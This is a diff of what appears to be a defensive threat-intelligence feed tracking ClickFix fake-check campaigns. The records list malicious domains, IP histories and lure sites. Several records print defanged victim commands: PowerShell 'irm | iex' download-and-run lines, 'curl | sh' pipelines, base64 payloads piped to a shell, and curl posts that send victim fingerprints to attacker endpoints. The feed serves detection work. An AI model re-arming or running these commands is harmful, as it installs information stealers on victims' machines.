@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 6332,
+ "count": 6329,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -16647,27 +16647,13 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "2a06:98c1:3121::3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "188.114.97.2",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -16678,6 +16664,20 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-25",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.97.2",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     }
    ],
@@ -24200,15 +24200,16 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=ddd72c97-6f58-4d8c-8e79-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Famsainspections.com%2F&os=Mac%2015&lastVisitAt=2026-11-20T19%3A11%3A04.748Z&lastShellAt=2026-11-20T19%3A11%3A04.748Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=e925a362-1c46-4e32-b7ca-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Famsainspections.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-20T19%3A05%3A55.445Z\"\" -d \"\"lastShellAt=2026-11-20T19%3A05%3A55.445Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\""
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=e56817b8-61b1-4d3d-a701-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Famsainspections.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T19%3A16%3A04.917Z\"\" -d \"\"lastShellAt=2026-11-27T19%3A16%3A04.917Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\"",
+    "curl -sL -d \"id=ddd72c97-6f58-4d8c-8e79-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Famsainspections.com%2F&os=Mac%2015&lastVisitAt=2026-11-20T19%3A11%3A04.748Z&lastShellAt=2026-11-20T19%3A11%3A04.748Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh"
    ],
    "connects_to": [
     "fingerprint-veri.info"
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -30418,68 +30419,6 @@
    "lure_from": []
   },
   {
-   "indicator": "aritacapital.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-11-14",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://www.aritacapital.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "- TierPoint",
-   "dns": "managed-vps.net",
-   "ip": "173.237.190.220",
-   "asn": "AS17378",
-   "org": "AS17378 - TierPoint, LLC, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "173.237.190.220",
-     "asn": "AS17378",
-     "org": "AS17378 - TierPoint, LLC, US",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-11-14"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.aritacapital.com",
-     "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-11-14"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "irm 'ncheck-brows[.]beer/[id]'|iex;"
-   ],
-   "connects_to": [
-    "xorados.com",
-    "groverudder12.com",
-    "t-trustrest.com",
-    "ncheck-brows.beer",
-    "browse-cloud.codes",
-    "trustchecknes.com",
-    "id-verfied.boats"
-   ],
-   "lure_from": [
-    "interseq.at",
-    "jscdncloude.beer",
-    "codes.caffe-img.com",
-    "codes.browse-cdn.beer",
-    "browse-nnccodes.beer"
-   ]
-  },
-  {
    "indicator": "arkcc.org",
    "type": "domain",
    "category": "clickfix",
@@ -31876,20 +31815,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -34106,14 +34045,14 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
     "trustchecknes.com",
-    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -38555,14 +38494,14 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
     "trustchecknes.com",
-    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -45870,17 +45809,17 @@
    "country": null,
    "ips": [
     {
-     "ip": "172.67.215.94",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-25",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "104.21.75.62",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.215.94",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-25",
      "last_seen": "2026-11-27"
     }
    ],
@@ -48593,14 +48532,14 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "t-trustresnew.com",
     "trustchecknes.com",
-    "j7tracker.gb.net",
     "github.pw"
    ],
    "lure_from": [
@@ -48681,7 +48620,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "104.21.67.102",
+   "ip": "2606:4700:3032::6815:4366",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -49061,7 +49000,7 @@
    "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
-   "url": "https://binhotransportes.com.br/acompanhe-sua-carga/",
+   "url": "https://binhotransportes.com.br/",
    "brand": null,
    "product": null,
    "hosting": "- Locaweb Servicos de Internet S/A",
@@ -52309,60 +52248,6 @@
    ]
   },
   {
-   "indicator": "blue-sky-peptides.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-10-22",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://blue-sky-peptides.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "HostPapa",
-   "dns": "websiteservername.com",
-   "ip": "66.84.21.139",
-   "asn": "AS40092",
-   "org": "ONIAAS - HostPapa, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "66.84.21.139",
-     "asn": "AS40092",
-     "org": "ONIAAS - HostPapa, US",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "blue-sky-peptides.com",
-     "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-22"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
-   ],
-   "connects_to": [
-    "t-trustrest.com",
-    "trek-72.com",
-    "github.pw"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
    "indicator": "bluebulletin.store",
    "type": "domain",
    "category": "clickfix",
@@ -54600,15 +54485,15 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "github.pw",
     "t-trustresnew.com",
-    "trustchecknes.com",
-    "j7tracker.gb.net"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -54686,7 +54571,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -55304,15 +55189,15 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//github[.]pw/8pchkbdes5/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
+    "j7tracker.gb.net",
     "github.pw",
     "t-trustresnew.com",
-    "trustchecknes.com",
-    "j7tracker.gb.net"
+    "trustchecknes.com"
    ],
    "lure_from": [
     "interseq.at"
@@ -61474,8 +61359,8 @@
     "efreitorher.org",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
-    "yaebalciganovvjopu.org",
-    "pizdalisibivet.org"
+    "barabulkaaaa.org",
+    "yaebalciganovvjopu.org"
    ]
   },
   {
@@ -67120,7 +67005,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "2606:4700:3030::ac43:c2b8",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -67133,14 +67018,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "172.67.194.184",
+     "ip": "2606:4700:3030::ac43:c2b8",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2606:4700:3030::ac43:c2b8",
+     "ip": "172.67.194.184",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -74076,15 +73961,17 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=8a6392ac-eba7-42a3-851a-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fcleanveins.org%2F&os=Mac%2015&lastVisitAt=2026-11-20T18%3A33%3A39.163Z&lastShellAt=2026-11-20T18%3A33%3A39.163Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=a13b4073-79cd-4744-974a-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcleanveins.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-20T18%3A25%3A53.811Z\"\" -d \"\"lastShellAt=2026-11-20T18%3A25%3A53.811Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -fsSL hxxps[:]//script-six-tawny[.]vercel[.]app/win | cmd\""
+    "curl -sL -d \"id=431cf9c6-e694-4d3d-af7c-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fcleanveins.org%2F&os=Mac%2015&lastVisitAt=2026-11-27T18%3A47%3A26.790Z&lastShellAt=2026-11-27T18%3A47%3A26.790Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=c2e67f5e-55e4-4097-abc9-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fcleanveins.org%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T18%3A45%3A54.465Z\"\" -d \"\"lastShellAt=2026-11-27T18%3A45%3A54.465Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
    ],
    "connects_to": [
-    "fingerprint-veri.info"
+    "fingerprint-veri.info",
+    "softify.lat"
    ],
    "lure_from": [
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -75103,13 +74990,6 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.12",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-22",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -75121,6 +75001,13 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-12",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.96.12",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-22",
      "last_seen": "2026-11-27"
     },
     {
@@ -82602,7 +82489,9 @@
    "lure_from": [
     "webrtwtre22.cc",
     "webffoo002.cc",
-    "browse-cloud.codes"
+    "browse-cloud.codes",
+    "tthcsslread21.cc",
+    "tlschssl22read.cc"
    ]
   },
   {
@@ -85603,10 +85492,10 @@
     "nikogdatakonebilo.cc",
     "efreitorher.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "yaebalciganovvjopu.org",
     "ciganshina.org",
-    "pakistanskimalchik.org",
-    "ktoktotam.cc"
+    "pakistanskimalchik.org"
    ]
   },
   {
@@ -87443,7 +87332,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.153.155",
+   "ip": "2606:4700:3035::ac43:999b",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -87456,14 +87345,14 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
+     "ip": "2606:4700:3035::ac43:999b",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "2606:4700:3035::ac43:999b",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -93153,7 +93042,8 @@
     "assetwaveapp.com",
     "bannerware.net",
     "trackbaseneo.net",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -95327,11 +95217,18 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
+    {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-25",
+     "last_seen": "2026-11-27"
+    },
     {
      "ip": "188.114.97.3",
      "asn": "AS13335",
@@ -95344,13 +95241,6 @@
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-25",
      "last_seen": "2026-11-27"
     }
    ],
@@ -100743,61 +100633,6 @@
     "trek-72.com",
     "t-trustresnew.com",
     "trustchecknes.com"
-   ],
-   "lure_from": [
-    "interseq.at"
-   ]
-  },
-  {
-   "indicator": "drquangtuan.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-20",
-   "last_seen": "2026-10-21",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://drquangtuan.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Vultr",
-   "dns": "zonedns.vn",
-   "ip": "45.76.178.229",
-   "asn": "AS20473",
-   "org": "AS-VULTR - The Constant Company, LLC, US",
-   "country": "SG",
-   "ips": [
-    {
-     "ip": "45.76.178.229",
-     "asn": "AS20473",
-     "org": "AS-VULTR - The Constant Company, LLC, US",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "drquangtuan.com",
-     "status": "online",
-     "first_seen": "2026-10-20",
-     "last_seen": "2026-10-21"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "iex(irm 'hxxps[:]//cosmical2049[.]com/wordpresscheck/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})",
-    "(irm 'hxxps[:]//github[.]pw/wp/[id]')|iex",
-    "echo \"[encoded]\" | base64 -d | bash ; curl -fsS 'hxxps[:]//t-trustresnew[.]com/x/wp' >/dev/null"
-   ],
-   "connects_to": [
-    "cosmical2049.com",
-    "github.pw",
-    "t-trustresnew.com",
-    "85.193.68.244"
    ],
    "lure_from": [
     "interseq.at"
@@ -128287,7 +128122,21 @@
    "country": null,
    "ips": [
     {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
      "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2606:4700:3035::6815:1e34",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -128301,21 +128150,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "2606:4700:3034::ac43:9699",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "2606:4700:3035::6815:1e34",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -129629,13 +129464,27 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
+     "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
      "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2606:4700:3030::6815:4331",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -129649,21 +129498,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "2a06:98c1:3121::3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "2606:4700:3030::6815:4331",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -156027,17 +155862,17 @@
    "country": null,
    "ips": [
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-17",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-17",
      "last_seen": "2026-11-27"
     }
    ],
@@ -156237,13 +156072,13 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.179.29",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "172.67.179.29",
+     "ip": "104.21.18.5",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -156264,7 +156099,7 @@
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.18.5",
+     "ip": "172.67.179.29",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -161691,14 +161526,14 @@
    "country": null,
    "ips": [
     {
-     "ip": "172.67.133.157",
+     "ip": "104.21.5.161",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "104.21.5.161",
+     "ip": "172.67.133.157",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -164099,20 +163934,6 @@
    "country": null,
    "ips": [
     {
-     "ip": "188.114.97.3",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
-     "ip": "104.21.90.212",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-26",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "172.67.161.106",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
@@ -164121,6 +163942,20 @@
     },
     {
      "ip": "188.114.96.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "188.114.97.3",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "104.21.90.212",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -164215,20 +164050,20 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.97.3",
+   "ip": "188.114.96.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "188.114.97.3",
+     "ip": "188.114.96.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
      "last_seen": "2026-11-27"
     },
     {
-     "ip": "188.114.96.3",
+     "ip": "188.114.97.3",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
@@ -170926,20 +170761,20 @@
    "product": "WhatsApp",
    "hosting": "- LWSA S/A",
    "dns": "gltecnologia.tec.br",
-   "ip": "187.1.137.118",
+   "ip": "2804:10:8015::137:118",
    "asn": "AS28299",
    "org": "AS28299 - LWSA S/A, BR",
    "country": "BR",
    "ips": [
     {
-     "ip": "187.1.137.118",
+     "ip": "2804:10:8015::137:118",
      "asn": "AS28299",
